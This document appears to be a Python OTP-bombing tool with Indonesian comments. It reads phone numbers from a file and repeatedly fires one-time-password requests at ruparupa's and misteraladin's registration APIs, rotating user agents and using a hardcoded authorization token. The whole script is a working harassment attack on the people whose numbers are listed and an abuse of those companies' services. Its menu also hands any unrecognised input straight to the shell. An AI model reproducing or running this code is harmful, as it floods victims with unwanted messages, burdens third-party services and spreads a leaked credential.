import requests
import json
import random
import rich
import os,sys
from rich import print as cetak
from rich.console import Console
from rich.panel import Panel as nel
Console = Console()
ipp = True
def main():
    while ipp == True:
      inputs = input("@Bimawawoy<>Spam-Wa|type menu to show list menu<> : ")
      if inputs.lower() == "start":
        mainspam()
      elif inputs.lower() == "settings":
        os.system("nano nomor.txt")
      elif inputs.lower() == "about":
        os.system("xdg-open https://private.gwbima.repl.co/")
      elif inputs.lower() == "menu":
          Console.print(nel("[bold cyan]start to spam\nsettings to configuration\nabout to show information about script.\nmenu to show menu\nexit to end program"))
      elif inputs.lower() == "exit":
        sys.exit()
        break
      else:
        os.system(inputs)
uaa = random.randint(1,99)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.80",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
       
]
def mainspam():
  try:
     #Mengubah nilai menjadi string
     nama_file = str("nomor.txt")

     #Membuat loop spam
     while True:
          ua = random.choice(user_agents)
      # Membuka file untuk dibaca
          with open(nama_file, 'r') as file:
          # Membaca isi file
              isi_file = file.read()

      # Memproses setiap baris dalam file
          for baris in isi_file.split('\n'):
          # Menghapus spasi atau karakter newline di awal dan akhir baris
              nomor = baris.strip()

          # Memeriksa apakah baris hanya terdiri dari spasi atau newline
              if not nomor:
                  continue  # Skip baris bila kosong
                  print("Skip baris karena kosong!")

              pos = requests.post(

            "https://wapi.ruparupa.com/auth/generate-otp",
            headers={
            "Host": "wapi.ruparupa.com",
            "content-length": "120",
            "sec-ch-ua-mobile": "?0",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs",
            "content-type": "application/json",
            "x-company-name": "odi",
            "accept": "application/json",
            "user-agent": ua,
            "user-platform": "desktop",
            "x-frontend-type": "desktop",
            "sec-ch-ua-platform": "Linux",
            "origin": "https://www.ruparupa.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.ruparupa.com/verification?page=otp-choices",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
            },
            data=json.dumps({"phone": "0" + nomor, "action": "register", "channel": "message", "email": "", "token": "", "customer_id": "0", "is_resend": 0})
        ).text
               #Api misteraladin 2
              requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":ua,"x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
                

              cetak('', '{:=^85s}'.format('Sukses spam ke nomor'), sep='\n')
              cetak("[bold cyan]Spam ke ",nomor)
              #null


          lanjutkan = input("Apakah Anda ingin melanjutkan spam? (y/n): ")
          if lanjutkan.lower() != 'y':
              break  # Menghentikan loop jika  tidak ingin melanjutkan

#Jika terjadi error maka program tidak akan terminated
  except FileNotFoundError:
     Console.log(nel("[bold red]You haven't input a number!!"))
  except EOFError:
     Console.log(nel("[bold red]CTRL + D Detected!!.Aborting..."))
  except requests.exceptions.ConnectionError:
     Console.log(nel("[bold red]Connection Aborted!"))
  except KeyboardInterrupt:
     Console.log(nel("CTRL + C detected!!.Aborting..."))


os.system("clear")
main()
